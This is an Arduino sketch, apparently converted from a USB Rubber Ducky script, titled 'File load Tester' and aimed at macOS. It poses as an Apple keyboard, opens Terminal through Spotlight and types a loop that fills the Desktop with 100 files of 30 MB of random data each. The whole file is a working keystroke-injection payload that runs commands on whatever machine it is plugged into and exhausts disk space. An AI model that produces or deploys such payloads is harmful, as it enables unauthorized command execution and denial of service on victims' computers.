// Generated with <3 by Dckuino.js !

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Code Begins Here

  // Creates 100 Files each containing 30MB of random data on the Desktop
  // Can modify the count=30 parameter to change the amount of MB in each file
  // Can modify the '100' to change the number of files created
  // please be EXTREMELY careful with load testing scripts as they can damage your system
  // Author: Narsty
  // Title: File load Tester
  // Target: MacOS
  // Version: 1.0
  // Category: Executions
  // ID 05ac:021e Apple:Keyboard
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("cd ~/Desktop && for i in {1..100}; do dd if=/dev/random of=file$i bs=1m count=30; done");

  delay(500);

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}